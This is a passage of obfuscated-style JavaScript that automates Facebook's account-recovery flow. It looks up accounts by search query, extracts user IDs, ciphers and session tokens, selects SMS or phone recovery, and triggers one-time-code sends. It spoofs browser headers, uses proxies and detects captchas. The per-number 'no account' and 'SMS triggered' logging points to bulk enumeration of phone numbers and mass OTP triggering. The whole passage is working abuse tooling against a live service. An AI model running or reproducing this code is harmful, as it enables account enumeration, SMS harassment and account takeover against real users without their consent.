      v1275.device_id = v1220.datr || "D8dsalb7sHwGphZmNCiTfW1G", v1275.waterfall_id = v1227, v1275.is_platform_login = 0x0, v1275.is_from_logged_out = 0x0, v1275.access_flow_version = "pre_mt_behavior", v1275.login_surface = "account_recovery", v1275.login_entry_point = "account_recovery", v1275.context_data = '';
      const v1276 = v1275,
        v1277 = {};
      v1277.lois_token = '';
      const v1278 = {};
      v1278.lois_settings = v1277, v1278.machine_id = '', v1278.zero_balance_state = '', v1278.aac = '';
      const v1279 = await fn22("com.bloks.www.caa.ar.initiate_view", "app", v1276, v1278);
      if (v1279 && v1279.data) {
        const v1280 = v1279.data.match(/"context_data"\s*:\s*"([^"]+)"/);
        v1280 && (v1242 = v1280[0x1], v1220.contextData = v1242, dbg("[BLOKS INIT] Extracted context_data: " + v1242.slice(0x0, 0x1e) + "..."));
      }
    }
    if (v1242) {
      dbg("[BLOKS AUTH METHOD] Navigating to phone search screen via auth_method...");
      const v1281 = {};
      v1281.device_id = v1220.datr || "D8dsalb7sHwGphZmNCiTfW1G", v1281.waterfall_id = v1227, v1281.is_platform_login = 0x0, v1281.is_from_logged_out = 0x0, v1281.access_flow_version = "pre_mt_behavior", v1281.login_surface = "account_recovery", v1281.login_entry_point = "account_recovery", v1281.context_data = v1242, v1281.back_nav_action = "BACK", v1281.INTERNAL_INFRA_screen_id = "7besuf:3";
      const v1282 = v1281,
        v1283 = {};
      v1283.lois_token = '';
      const v1284 = {};
      v1284.lois_settings = v1283, v1284.zero_balance_state = '', v1284.aac = '';
      const v1285 = await fn22("com.bloks.www.caa.ar.auth_method", "app", v1282, v1284);
      if (v1285 && v1285.data) {
        const v1286 = v1285.data.match(/"context_data"\s*:\s*"([^"]+)"/);
        v1286 && (v1242 = v1286[0x1], v1220.contextData = v1242, dbg("[BLOKS AUTH METHOD] Updated context_data from auth_method: " + v1242.slice(0x0, 0x1e) + "..."));
      }
    }
    const v1243 = {
        'event_request_id': v1228,
        'INTERNAL__latency_qpl_marker_id': 0x2301b43,
        'INTERNAL__latency_qpl_instance_id': String(Date.now()) + '00',
        'device_id': null,
        'family_device_id': null,
        'waterfall_id': v1227,
        'offline_experiment_group': null,
        'layered_homepage_experiment_group': null,
        'is_platform_login': 0x0,
        'is_from_logged_in_switcher': 0x0,
        'is_from_logged_out': 0x0,
        'access_flow_version': "pre_mt_behavior",
        'login_surface': "unknown",
        'context_data': v1242
      },
      v1244 = {};
    v1244.lois_token = '';
    const v1245 = {
      'zero_balance_state': null,
      'search_query': v1219,
      'fetched_email_list': [],
      'fetched_email_token_list': {},
      'sso_accounts_auth_data': [],
      'sfdid': '',
      'text_input_id': Math.random().toString(0x24).substring(0x2, 0x8) + ":55",
      'encrypted_msisdn': '',
      'headers_infra_flow_id': '',
      'was_headers_prefill_available': 0x0,
      'was_headers_prefill_used': 0x0,
      'ig_oauth_token': [],
      'android_build_type': '',
      'is_whatsapp_installed': 0x0,
      'device_network_info': null,
      'accounts_list': [],
      'is_oauth_without_permission': 0x0,
      'search_screen_type': "mobile",
      'ig_vetted_device_nonce': '',
      'gms_incoming_call_retriever_eligibility': "client_not_supported",
      'auth_secure_device_id': '',
      'blocked_uids': [],
      'cloud_trust_token': null,
      'network_bssid': null,
      'lois_settings': v1244,
      'aac': ''
    };
    dbg("[BLOKS SEARCH] Executing search.async query for " + v1219);
    const v1246 = await fn22("com.bloks.www.caa.ar.search.async", "action", v1243, v1245);
    dbg("[BLOKS SEARCH] HTTP " + v1246.status + " - Data Length: " + (v1246.data ? v1246.data.length : 0x0));
    if (v1246.status !== 0xc8 || !v1246.data) {
      const v1287 = {};
      return v1287.ok = false, v1287.error = "Bloks Search HTTP " + v1246.status, v1287;
    }
    const v1247 = v1246.data || '',
      v1248 = v1246.encoding || "unknown",
      v1249 = v1247.replace(/[^\x20-\x7E]/g, '');
    dbg("[BLOKS SEARCH RESP] encoding=" + v1248 + " len=" + v1247.length), dbg("[BLOKS RESP A] " + v1249.slice(0x0, 0x5dc));
    if (v1249.length > 0x5dc) dbg("[BLOKS RESP B] " + v1249.slice(0x5dc, 0xbb8));
    const v1250 = v1247.includes("caa_account_recovery_client_events_fb") && v1247.includes("caa_core_data_encrypted"),
      v1251 = v1247.includes("caa_acquisition_client_fb_event") || v1247.includes("No accounts match") || v1247.includes("no_account_found") || v1247.includes("ACCOUNT_NOT_FOUND");
    dbg("[BLOKS SEARCH] account_found=" + v1250 + " no_account=" + v1251 + " len=" + v1247.length);
    if (v1251 || !v1250) {
      dbg('+' + v1219 + " BLOKS SEARCH: no account");
      const v1288 = {};
      return v1288.ok = false, v1288.result = "no_account", v1288;
    }
    const v1252 = v1247.match(/"(Ad[A-Za-z0-9_\-+/]{50,}\|arm)"/);
    if (v1252) v1220.contextData = v1252[0x1], dbg("[BLOKS SEARCH] Extracted context_data from Bloks DSL: " + v1220.contextData.slice(0x0, 0x28) + "...");else {
      const v1289 = v1247.match(/"context_data"\s*:\s*"([^"]+)"/);
      v1289 && (v1220.contextData = v1289[0x1], dbg("[BLOKS SEARCH] Extracted context_data from JSON: " + v1220.contextData.slice(0x0, 0x28) + "..."));
    }
    if (!v1220.contextData) {
      dbg('+' + v1219 + " BLOKS SEARCH FAIL: no context_data in search response");
      const v1290 = {};
      return v1290.ok = false, v1290.result = "no_account", v1290;
    }
    let v1253 = v1247.match(/"u"\s*:\s*"?(\d{8,16})"?/) || v1247.match(/"user_id"\s*:\s*"?(\d{8,16})"?/) || v1247.match(/"account_id"\s*:\s*"?(\d{8,16})"?/) || v1247.match(/"fbid"\s*:\s*"?(\d{8,16})"?/) || v1247.match(/\\"user_id\\"\s*:\s*\\"?(\d{8,16})\\"?/) || v1247.match(/\b(615\d{11,13}|1000\d{10,12})\b/);
    v1253 && (v1220.accountUid = v1253[0x1], v1220.searchUid = v1253[0x1]);
    dbg("[BLOKS SEARCH] Account found! ctxData=" + v1220.contextData.slice(0x0, 0x28) + "... | uid=" + (v1220.accountUid || "unknown")), dbg("[BLOKS SEARCH] Executing auth_option_selection.async to select SMS OTP...");
    const v1254 = v1228 || v1220.eventRequestId || crypto.randomUUID(),
      v1255 = {};
    v1255.is_loading = "2;fow2myypt;0";
    const v1256 = {
        'device_id': v1220.datr || '',
        'event_request_id': v1254,
        'login_type': "FB_SSO",
        'auth_options': ["whatsapp", "phone", "password"],
        'lara_usage': 0x1,
        'INTERNAL__latency_qpl_marker_id': 0x2301b43,
        'INTERNAL__latency_qpl_instance_id': String(Date.now()) + "00103",
        'family_device_id': null,
        'waterfall_id': v1227,
        'offline_experiment_group': null,
        'layered_homepage_experiment_group': null,
        'is_platform_login': 0x0,
        'is_from_logged_in_switcher': 0x0,
        'is_from_logged_out': 0x0,
        'access_flow_version': "pre_mt_behavior",
        'login_surface': "account_recovery",
        'login_entry_point': "account_recovery",
        'context_data': v1220.contextData,
        'serialized_states': v1255
      },
      v1257 = {};
    v1257.lois_token = '';
    const v1258 = {};
    v1258.family_device_id = '', v1258.machine_id = '', v1258.zero_balance_state = '', v1258.auth_option = "phone", v1258.android_build_type = '', v1258.selected_phone_number_index = null, v1258.selected_xapp_contactpoint_index = 0x0, v1258.selected_encrypted_bloks_xapp_cp_lookup_data = '', v1258.cloud_trust_token = null, v1258.network_bssid = null, v1258.lois_settings = v1257, v1258.aac = '';
    const v1259 = v1258,
      v1260 = await fn22("com.bloks.www.caa.ar.auth_option_selection.async", "action", v1256, v1259);
    if (v1260 && v1260.data) {
      const v1291 = v1260.data,
        v1292 = v1291.replace(/[^\x20-\x7E]/g, '').slice(0x0, 0x12c);
      dbg("[BLOKS OPTION RESP] encoding=" + (v1260.encoding || "unknown") + " len=" + v1291.length + " printable=" + v1292);
      if (v1291.includes("no_sms") || v1291.includes("no_phone") || v1291.includes("email_only")) {
        dbg('+' + v1219 + " BLOKS OPTION FAIL: no SMS available");
        const v1295 = {};
        return v1295.ok = false, v1295.result = "no_sms", v1295;
      }
      const v1293 = v1291.includes("CODE_ENTRY") || v1291.includes("code_entry") || v1291.includes("code_send_succ");
      dbg("[BLOKS OPTION] SMS trigger markers present: " + v1293);
      const v1294 = v1291.match(/"(Ad[A-Za-z0-9_\-+/]{50,}\|arm)"/);
      if (v1294) v1220.contextData = v1294[0x1], dbg("[BLOKS OPTION] Updated context_data (DSL): " + v1220.contextData.slice(0x0, 0x28) + "...");else {
        const v1296 = v1291.match(/"context_data"\s*:\s*"([^"]+)"/);
        v1296 && (v1220.contextData = v1296[0x1], dbg("[BLOKS OPTION] Updated context_data (JSON): " + v1220.contextData.slice(0x0, 0x28) + "..."));
      }
    } else dbg("[BLOKS OPTION] No response from auth_option_selection.async");
    dbg('++' + v1219 + " BLOKS SMS triggered via auth_option_selection.async (phone) — context_data=" + (v1220.contextData ? v1220.contextData.slice(-8) : "NULL"));
    const v1261 = {};
    v1261.id = v1220.accountUid || '0';
    const v1262 = {};
    return v1262.ok = true, v1262.accounts = [v1261], v1262.searchCipher = v1220.contextData, v1262.searchCuid = null, v1262.redirectUri = null, v1262.wfId = v1227, v1262.evId = v1228, v1262;
  }
  const v1229 = {};
  v1229.cipher_text = v1220.initialCipher || null, v1229.context = "recover", v1229.event_request_id = v1228, v1229.friend_name = '';
  v1229.search_query = v1219, v1229.waterfall_id = v1227;
  const v1230 = v1229,
    v1231 = {};
  v1231.params = v1230;
  const v1232 = buildParams(v1220, "27012969198380071", "CAAFBAccountSearchViewQuery", v1231, v1223, v1224),
    v1233 = v1225 || "https://www.facebook.com/login/identify/",
    v1234 = await graphqlPost(v1232, buildHeaders(v1220, v1222, "CAAFBAccountSearchViewQuery", v1224, v1233), 0x3a98, v1221, "www.facebook.com"),
    v1235 = parseResp(v1234.data);
  if (v1234.status !== 0xc8) return {
    'ok': false,
    'error': "HTTP " + v1234.status
  };
  const v1236 = {};
  v1236.ok = false, v1236.error = "Parse failed";
  if (!v1235) return v1236;
  if (v1235.errors) {
    dbg('+' + v1219 + " GRAPHQL ERROR: " + JSON.stringify(v1235.errors));
    const v1297 = {};
    return v1297.ok = false, v1297.error = "GraphQL error", v1297;
  }
  const v1237 = v1235?.["data"]?.["caa_ar_fb_account_search"];
  if (!v1237 || !v1237.accounts || v1237.accounts.length === 0x0) {
    dbg('+' + v1219 + " SEARCH FAIL: no_account");
    const v1298 = {};
    return v1298.ok = false, v1298.result = "no_account", v1298;
  }
  dbg("[SEARCH] " + v1237.accounts.length + " account(s) found");
  const fn20 = v1299 => v1299 && !String(v1299).startsWith("17848") && !String(v1299).startsWith("17849") && !(Number(v1299) >= 0x6553f100 && Number(v1299) <= 0x77359400),
    fn21 = v1300 => v1300 && v1300 !== '0' && v1300 !== "deleted" && fn20(String(v1300)) && /^\d{8,16}$/.test(String(v1300)),
    v1238 = v1237.accounts[0x0];
  if (v1238) {
    const v1301 = [v1238.id, v1238.account_id, v1238.user_id, v1238.profile_id, v1238.fbid, v1238.uid, v1238.actor_id].find(fn21);
    v1301 && (v1220.accountUid = String(v1301), v1220.searchUid = String(v1301), cdbg("[SEARCH] Extracted accountUid: " + v1220.accountUid));
  }
  let v1239 = v1237.cipher || v1237.cipher_text || null;
  if (!v1239 && v1237.redirect_uri) {
    const v1302 = v1237.redirect_uri.match(/[?&]ci=([^&]+)/);
    if (v1302) v1239 = v1302[0x1];
  }
  !v1239 && v1238 && (v1239 = v1238.cipher || v1238.cipher_text || null);
  !v1239 && (v1239 = v1220.initialCipher || null);
  const v1240 = v1237.accounts[0x0] && v1237.accounts[0x0].cuid || null;
  if (v1240) dbg("[SEARCH] cuid extracted: " + v1240.slice(0x0, 0xc) + "...");
  const v1241 = {};
  return v1241.ok = true, v1241.accounts = v1237.accounts, v1241.searchCipher = v1239, v1241.searchCuid = v1240, v1241.redirectUri = v1237.redirect_uri, v1241.wfId = v1227, v1241.evId = v1228, v1241;
}
async function selectAccount(v1303, v1304, v1305, v1306, v1307, v1308, v1309, v1310, v1311, v1312 = null) {
  const v1313 = v1312 || v1306.waterfallId || uuid();
  v1306.waterfallId = v1313;
  const v1314 = {};
  v1314.actor_id = '0', v1314.client_mutation_id = '1', v1314.access_flow_version = "pre_mt_behavior", v1314.cipher = v1304, v1314.idx = v1305, v1314.waterfall_id = v1313;
  const v1315 = {};
  v1315.input = v1314;
  const v1316 = buildParams(v1306, "9730637087034984", "useCAAAccountSearchSelectMutation", v1315, v1309, v1310);
  const v1317 = await graphqlPost(v1316, buildHeaders(v1306, v1308, "useCAAAccountSearchSelectMutation", v1310, v1311 || "https://www.facebook.com/login/identify/"), 0x3a98, v1307, "www.facebook.com");
  const v1318 = parseResp(v1317.data),
    v1319 = {};
  v1319.ok = false, v1319.error = "selectAccount failed";
  if (v1317.status !== 0xc8 || !v1318 || v1318.errors) return v1319;
  const v1320 = v1318?.["data"]?.["caa_ar_fb_search_select_account"],
    v1321 = v1320?.["select_uri"] || '',
    v1322 = v1321.match(/[?&]ci=([^&]+)/),
    v1323 = v1322 ? v1322[0x1] : null;
  dbg("[SELECT] select_uri=" + v1321.substring(0x0, 0x3c) + " cipher=" + (v1323 ? "..." + v1323.slice(-8) : "NULL")), mergeCookies(v1306, v1317.headers);
  const v1324 = {};
  return v1324.ok = true, v1324.selectCipher = v1323, v1324;
}
async function getInitiateView(v1325, v1326, v1327, v1328, v1329, v1330, v1331, v1332 = null) {
  const v1333 = v1332 || v1326.waterfallId || uuid();
  v1326.waterfallId = v1333;
  const v1334 = {};
  v1334.cipher = v1325, v1334.waterfall_id = v1333;
  const v1335 = {};
  v1335.params = v1334;
  const v1336 = buildParams(v1326, "29028192460103922", "CAAFBARInitiateViewPushableQuery", v1335, v1329, v1330, "comet.fbweb.CometCAAARInitiateViewRoute"),
    v1337 = await graphqlPost(v1336, buildHeaders(v1326, v1328, "CAAFBARInitiateViewPushableQuery", v1330, v1331 || "https://www.facebook.com/login/identify/"), 0x3a98, v1327, "www.facebook.com"),
    v1338 = parseResp(v1337.data);
  dbg("[INITIATE] HTTP " + v1337.status + " | parsed=" + !!v1338 + " | errors=" + (v1338?.["errors"] ? JSON.stringify(v1338.errors[0x0]) : "none"));
  const v1339 = {};
  v1339.ok = false, v1339.error = "initiateView failed";
  if (v1337.status !== 0xc8 || !v1338 || v1338.errors) return v1339;
  mergeCookies(v1326, v1337.headers);
  const v1340 = v1338?.["data"]?.["caa_ar_fb_initiate_view"];
  dbg("[INITIATE] allow_display=" + v1340?.["allow_display"] + " cipher=" + (v1340?.["cipher"] ? '✓' : "NULL") + " opts=" + (v1340?.["contactpoint_options"]?.["length"] || 0x0));
  const v1341 = {};
  v1341.ok = false, v1341.error = "no initiate view";
  if (!v1340) return v1341;
  const v1342 = v1340.contactpoint_options || v1340.contact_point_options || v1340.recovery_options || [],
    v1343 = v1340.preselected_cp || null,
    v1344 = v1340.profiles || [];
  let v1345 = v1340.cipher_text || v1340.cipher || v1343?.["cipher_text"] || v1343?.["cipher"] || null,
    v1346 = "send_sms",
    v1347 = null;
  if (v1342.length > 0x0) {
    v1347 = v1342.find(v1352 => {
      const v1353 = (v1352.key || v1352.type || v1352.method || v1352.contact_type || '').toLowerCase();
      return v1353.includes("sms") || v1353.includes("phone") || v1353.includes("mobile") || v1353.includes("whatsapp") || v1353.includes('wa') || v1353.includes("viber");
    }) || v1342[0x0];
    if (!v1345) v1345 = v1347?.["cipher_text"] || v1347?.["cipher"] || null;
  }
  if (!v1345 && v1344.length > 0x0) for (const v1354 of v1344) {
    const v1355 = v1354.contact_points || v1354.contactpoint_options || v1354.contact_point_options || v1354.recovery_options || [],
      v1356 = v1354.preselected_cp || null;
    if (!v1345 && v1356 && typeof v1356 === "object") {
      v1345 = v1356.cipher_text || v1356.cipher || null;
      if (!v1347) v1347 = v1356;
    }
    for (const v1357 of v1355) {
      const v1358 = (v1357.key || v1357.type || v1357.method || v1357.contact_type || '').toLowerCase(),
        v1359 = v1357.cipher_text || v1357.cipher;
      !v1347 && (v1358.includes("sms") || v1358.includes("phone") || v1358.includes("mobile") || v1358.includes("text") || v1358.includes("whatsapp") || v1358.includes("viber")) && (v1347 = v1357), v1359 && !v1345 && (v1345 = v1357.cipher_text || v1357.cipher);
    }
    if (v1345 && v1347) break;
  }
  if (!v1347 && v1344.length > 0x0) for (const v1360 of v1344) {
    const v1361 = v1360.contact_points || v1360.contactpoint_options || v1360.contact_point_options || v1360.recovery_options || [];
    v1347 = v1361.find(v1362 => {
      const v1363 = (v1362.key || v1362.type || '').toLowerCase();
      return v1363.includes("sms") || v1363.includes("phone") || v1363.includes("mobile") || v1363.includes("whatsapp");
    }) || v1361[0x0] || null;
    if (v1347) break;
  }
  if (v1347) v1346 = v1347.key || v1347.type || v1347.method || v1347.contact_type || "send_sms";else typeof v1340.preselected_cp === "string" && v1340.preselected_cp && (v1346 = v1340.preselected_cp);
  dbg("[INITIATE] cipher=" + (v1345 ? "..." + v1345.slice(-8) : "NULL") + " method=" + v1346 + " profiles=" + v1344.length + " flatOpts=" + v1342.length);
  const v1348 = {};
  v1348.ok = false, v1348.error = "no cipher in initiate view";
  if (!v1345) return v1348;
  const v1349 = v1346 && v1346.toLowerCase().startsWith("send_email"),
    v1350 = {};
  v1350.ok = false, v1350.error = "no_sms";
  if (v1349) return v1350;
  const v1351 = {};
  return v1351.ok = true, v1351.cipher = v1345, v1351.recoverMethod = v1346, v1351;
}
async function conversationalSupportQuery(v1364, v1365, v1366, v1367, v1368, v1369, v1370 = null, v1371 = null, v1372 = null, v1373 = null) {
  const v1374 = v1369 || "https://www.facebook.com/recover/initiate/?ci=" + encodeURIComponent(v1364),
    v1375 = buildParams(v1365, "27102018216149070", "ConversationalSupportFBFPChatExperienceQuery", {
      'request': {
        'cipher': v1364,
        'cuid': v1370 || null,
        'existing_token': v1371 || null
      }
    }, 0x0, v1368, "comet.fbweb.CometCAAARInitiateViewRoute"),
    v1376 = Date.now(),
    v1377 = uuid(),
    v1378 = v1372 || v1365.flowSessionId || "upl_wizard_" + v1376 + '_' + v1377,
    v1379 = v1373 || v1365.uplSessionId || "upl_" + v1376 + '_' + uuid();
  v1365.flowSessionId = v1378;
  v1365.uplSessionId = v1379;
  const v1380 = buildHeaders(v1365, v1367, "ConversationalSupportFBFPChatExperienceQuery", v1368, v1374);
  const v1381 = v1367?.["browserType"] === "firefox" || v1367?.["browserType"] === "firefox_linux" || SELECTED_BROWSER === "firefox",
    v1382 = v1381 ? v1380 : {
      'Accept': v1380.Accept,
      'Accept-Encoding': v1380["Accept-Encoding"],
      'Accept-Language': v1380["Accept-Language"],
      'Content-Type': v1380["Content-Type"],
      'Cookie': v1380.Cookie,
      'Origin': v1380.Origin,
      'Priority': v1380.Priority,
      'Referer': v1380.Referer,
      ...Object.fromEntries(Object.entries(v1380).filter(([v1383]) => v1383.startsWith("sec-ch-"))),
      'sec-fetch-dest': v1380["sec-fetch-dest"],
      'sec-fetch-mode': v1380["sec-fetch-mode"],
      'sec-fetch-site': v1380["sec-fetch-site"],
      'User-Agent': v1380["User-Agent"],
      'X-ASBD-ID': v1380["X-ASBD-ID"],
      'x-bh-flowsessionid': v1378,
      'X-FB-Friendly-Name': v1380["X-FB-Friendly-Name"],
      'X-FB-LSD': v1380["X-FB-LSD"],
      'x-fb-upl-sessionid': v1379
    };
  try {
    const v1384 = await graphqlPost(v1375, v1382, 0x2ee0, v1366, "www.facebook.com");
    mergeCookies(v1365, v1384.headers);
    const v1385 = parseResp(v1384.data),
      v1386 = v1385?.["data"]?.["init_conversational_support_attempt_for_fb_forgot_password"] || v1385?.["data"]?.["conversational_support_fbfp_chat_experience"] || null,
      v1387 = v1386?.["cuid"] || null,
      v1388 = v1386?.["attempt_token"] || v1386?.["token"] || v1386?.["session_token"] || null;
    dbg("[CHAT SUPPORT] HTTP " + v1384.status + " cuid=" + (v1387 ? '✓' : "null") + " token=" + (v1388 ? '✓' : "null"));
    const v1389 = {};
    return v1389.ok = true, v1389.cuid = v1387, v1389.token = v1388, v1389.flowSessionId = v1378, v1389.uplSessionId = v1379, v1389;
  } catch (v1390) {
    dbg("[CHAT SUPPORT] skipped (" + v1390.message + ')');
    const v1391 = {};
    return v1391.ok = false, v1391.cuid = null, v1391.token = null, v1391.flowSessionId = v1378, v1391.uplSessionId = v1379, v1391;
  }
}
async function sendOTP(v1392, v1393, v1394, v1395, v1396, v1397, v1398, v1399, v1400, v1401) {
  v1396.clientMutationId = (v1396.clientMutationId || 0x0) + 0x1;
  const v1402 = {
      'input': {
        'actor_id': '0',
        'client_mutation_id': String(v1396.clientMutationId),
        'access_flow_version': "pre_mt_behavior",
        'cipher': v1394,
        'event_request_id': v1393,
        'recover_method': v1395,
        'waterfall_id': v1392
      },
      'scale': 0x1
    },
    v1403 = buildParams(v1396, "25714184854871712", "useCAASendRecoveryCodeMutation", v1402, v1399, v1400, "comet.fbweb.CometCAAARInitiateViewRoute");
  const v1404 = v1401 || "https://www.facebook.com/login/identify/";
  if (SELECTED_BROWSER === "via_browser") {
    dbg("[SEND] Via Browser Mode: Executing m.facebook.com Bloks SMS captcha async send for cipher=" + v1394.slice(0x0, 0xf) + "...");
    const v1415 = "/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.sms_captcha.async&type=action&__bkv=8d7a099705c6918973f9eb638946ec70f8b902374eed3558006659bdf45d268b",
      v1416 = {
        'event_request_id': v1393,
        'INTERNAL__latency_qpl_marker_id': 0x2301b43,
        'INTERNAL__latency_qpl_instance_id': String(Date.now()) + '00',
        'device_id': null,
        'family_device_id': null,
        'waterfall_id': v1392,
        'offline_experiment_group': null,
        'layered_homepage_experiment_group': null,
        'is_platform_login': 0x0,
        'is_from_logged_in_switcher': 0x0,
        'is_from_logged_out': 0x0,
        'access_flow_version': "pre_mt_behavior",
        'login_surface': "unknown",
        'context_data': v1396.contextData || ''
      },
      v1417 = {};
    v1417.cipher = v1394, v1417.cuid = v1396.accountUid || null, v1417.contact_point_type = "sms", v1417.recovery_method = "send_sms";
    const v1418 = v1417,
      v1419 = {};
    v1419.server_params = v1416, v1419.client_input_params = v1418;
    const v1420 = JSON.stringify({
        'params': JSON.stringify(v1419)
      }),
      v1421 = new URLSearchParams();
    v1421.set("__aaid", '0'), v1421.set("__user", '0'), v1421.set("__a", '1');
    if (!v1396.__req) v1396.__req = 0xa;
    v1421.set("__req", (v1396.__req++).toString(0x10)), v1421.set("__hs", v1396.__hs || "20687.BP:wbloks_caa_pkg.2.0...0"), v1421.set("dpr", '3'), v1421.set("__ccg", "EXCELLENT"), v1421.set("__rev", v1396.rev || "1045798079"), v1421.set("__s", v1396.__s || ''), v1421.set("__hsi", v1396.hsi || String(Date.now())), v1421.set("__dyn", v1396.__dyn || ''), v1421.set("fb_dtsg", v1396.fb_dtsg || '');
    let v1422 = "24976";
    if (v1396.fb_dtsg) {
      let v1429 = 0x0;
      for (let v1430 = 0x0; v1430 < v1396.fb_dtsg.length; v1430++) v1429 += v1396.fb_dtsg.charCodeAt(v1430);
      v1422 = '2' + v1429;
    }
    v1421.set("jazoest", v1396.jazoest || v1422), v1421.set("lsd", v1396.lsd || ''), v1421.set("params", v1420);
    const v1423 = v1401 || "https://m.facebook.com/login/identify/",
      v1424 = await bloksPostPage(v1415, v1421.toString(), v1396.cookieHeader, 0x3a98, "m.facebook.com", v1397, v1398, v1423);
    if (v1424.headers) mergeCookies(v1396, v1424.headers);
    dbg("[SEND VIA BROWSER] HTTP " + v1424.status + " - Data Length: " + (v1424.data ? v1424.data.length : 0x0));
    if (v1424.status !== 0xc8 || !v1424.data) return {
      'ok': false,
      'error': "HTTP " + v1424.status
    };
    const v1425 = v1424.data || '';
    if (v1425.includes("No accounts match") || v1425.includes("no_account_found") || v1425.includes("ACCOUNT_NOT_FOUND")) {
      dbg("[SEND VIA BROWSER] FAIL: no_account");
      const v1431 = {};
      return v1431.ok = false, v1431.error = "no_account", v1431;
    }
    if (v1425.includes("error_message") || v1425.includes("error_code")) {
      const v1432 = v1425.match(/"error_message"\s*:\s*"([^"]+)"/) || v1425.match(/"message"\s*:\s*"([^"]+)"/),
        v1433 = v1432 ? v1432[0x1] : "Bloks SMS send error";
      dbg("[SEND VIA BROWSER] FAIL: " + v1433);
      const v1434 = {};
      return v1434.ok = false, v1434.error = v1433, v1434;
    }
    const v1426 = v1425.match(/[?&]ci=([A-Za-z0-9_\-]+)/) || v1425.match(/"cipher(?:_text)?"\s*:\s*"([A-Za-z0-9_\-]+)"/) || v1425.match(/cipher=([A-Za-z0-9_\-]+)/),
      v1427 = v1426 ? v1426[0x1] : v1394,
      v1428 = {};
    return v1428.ok = true, v1428.sendCipher = v1427, v1428.accountUid = v1396.accountUid || null, v1428;
  }
  const v1405 = buildHeaders(v1396, v1398, "useCAASendRecoveryCodeMutation", v1400, v1404),
    v1406 = await graphqlPost(v1403, v1405, 0x3a98, v1397, "www.facebook.com");
  dbg("[SEND] HTTP " + v1406.status);
  if (v1406.status !== 0xc8) return {
    'ok': false,
    'error': "HTTP " + v1406.status
  };
  const v1407 = parseResp(v1406.data),
    v1408 = {};
  v1408.ok = false;
  v1408.error = "Parse failed";
  if (!v1407) return v1408;
  if (v1407.errors) {
    const v1435 = v1407.errors[0x0]?.["message"] || "GraphQL error";
    dbg("[SEND] GRAPHQL ERROR: " + v1435 + " | full=" + JSON.stringify(v1407.errors[0x0]));
    const v1436 = {};
    return v1436.ok = false, v1436.error = v1435, v1436;
  }
  const v1409 = v1407?.["data"]?.["caa_ar_fb_send_confirmation_code"];
  dbg("[SEND] result=" + JSON.stringify(v1409));
  const v1410 = {};
  v1410.ok = false, v1410.error = "no result in send response";
  if (!v1409) return v1410;
  const v1411 = {};
  v1411.ok = false, v1411.error = "captcha";
  if (v1409.captcha_persist_data) return v1411;
  const v1412 = v1406.headers && v1406.headers["set-cookie"];
  if (v1412) {
    const v1437 = {};
    (v1396.cookieHeader || '').split(';').forEach(v1439 => {
      const v1440 = v1439.indexOf('=');
      if (v1440 < 0x0) return;
      v1437[v1439.slice(0x0, v1440).trim()] = v1439.slice(v1440 + 0x1).trim();
    });
    const v1438 = Array.isArray(v1412) ? v1412 : [v1412];
    v1438.forEach(v1441 => {
      const v1442 = v1441.split(';')[0x0].split('=');
      if (v1442.length >= 0x2) v1437[v1442[0x0].trim()] = v1442.slice(0x1).join('=').trim();
    }), v1396.cookieHeader = Object.entries(v1437).map(([v1443, v1444]) => v1443 + '=' + v1444).join(';\x20'), dbg("[SEND] Merged " + v1438.length + " cookie(s) into session from sendOTP response");
  }
  let v1413 = null;
  if (v1409.redirect_uri) {
    const v1445 = v1409.redirect_uri.match(/[?&]ci=([A-Za-z0-9_\-]+)/);
    if (v1445) v1413 = v1445[0x1];
    dbg("[SEND] redirect_uri=" + v1409.redirect_uri + " → sendCipher=" + (v1413 ? "..." + v1413.slice(-8) : "NULL"));
    try {
      const v1446 = v1409.redirect_uri.startsWith("http") ? (() => {
        try {
          const v1461 = new URL(v1409.redirect_uri);
          return v1461.pathname + v1461.search;
        } catch (v1462) {
          return v1409.redirect_uri;
        }
      })() : v1409.redirect_uri;
      dbg("[SEND] GET code page (via " + (v1397 ? "proxy" : "direct") + "): " + v1446);
      const v1447 = await httpsGetPageWithRedirects(v1446, v1396.cookieHeader, 0x3a98, "www.facebook.com", v1397, v1398, "https://www.facebook.com/login/identify/");
      if (v1447.cookieHeader) v1396.cookieHeader = v1447.cookieHeader;
      const v1448 = v1447.headers && v1447.headers["set-cookie"];
      if (v1448) {
        const v1463 = {};
        (v1396.cookieHeader || '').split(';').forEach(v1465 => {
          const v1466 = v1465.indexOf('=');
          if (v1466 < 0x0) return;
          v1463[v1465.slice(0x0, v1466).trim()] = v1465.slice(v1466 + 0x1).trim();
        });
        const v1464 = Array.isArray(v1448) ? v1448 : [v1448];
        v1464.forEach(v1467 => {
          const v1468 = v1467.split(';')[0x0].split('=');
          if (v1468.length >= 0x2) {
            const v1469 = v1468[0x0].trim(),
              v1470 = v1468.slice(0x1).join('=').trim();
            if (v1470 !== "deleted" && !v1470.startsWith("deleted;")) v1463[v1469] = v1470;
          }
        }), v1396.cookieHeader = Object.entries(v1463).map(([v1471, v1472]) => v1471 + '=' + v1472).join(';\x20'), dbg("[SEND] Code page merged. sfiu=" + (v1463.sfiu ? "✓ len=" + v1463.sfiu.length : '✗') + " keys=" + Object.keys(v1463).join(','));
      } else dbg("[SEND] Code page: NO set-cookie in response (status=" + v1447.status + ')');
      const v1449 = v1447.data || '',
        v1450 = v1449.match(/"LSD",\[\],\{"token":"([^"]+)"/)?.[0x1];
      if (v1450 && v1450 !== v1396.lsd) {
        v1396.lsd = v1450;
        let v1473 = 0x0;
        for (let v1474 = 0x0; v1474 < v1450.length; v1474++) v1473 += v1450.charCodeAt(v1474);
        v1396.jazoest = '2' + v1473, dbg("[SEND] Updated lsd+jazoest from code page");
      }
      const v1451 = v1449.match(/"__s"\s*:\s*"([a-zA-Z0-9_-]+:[a-zA-Z0-9_-]+:[a-zA-Z0-9_-]+)"/);
      v1451 && v1451[0x1] && (v1396.__s_code = v1451[0x1], v1396.__s = v1451[0x1], dbg("[SEND] Extracted __s: " + v1396.__s_code));
      const v1452 = v1449.match(/"haste_session"\s*:\s*"([^"]+)"/) || v1449.match(/"__hs"\s*:\s*"([^"]+)"/);
      v1452 && v1452[0x1] && (v1396.__hs = v1452[0x1], dbg("[SEND] Extracted __hs: " + v1396.__hs));
      const v1453 = v1449.match(/"__dyn"\s*:\s*"([^"]+)"/);
      v1453 && v1453[0x1] && (v1396.__dyn_code = v1453[0x1], v1396.__dyn = v1453[0x1]);
      const v1454 = v1449.match(/"__csr"\s*:\s*"([^"]+)"/);
      v1454 && v1454[0x1] && (v1396.__csr_code = v1454[0x1], v1396.__csr = v1454[0x1]);
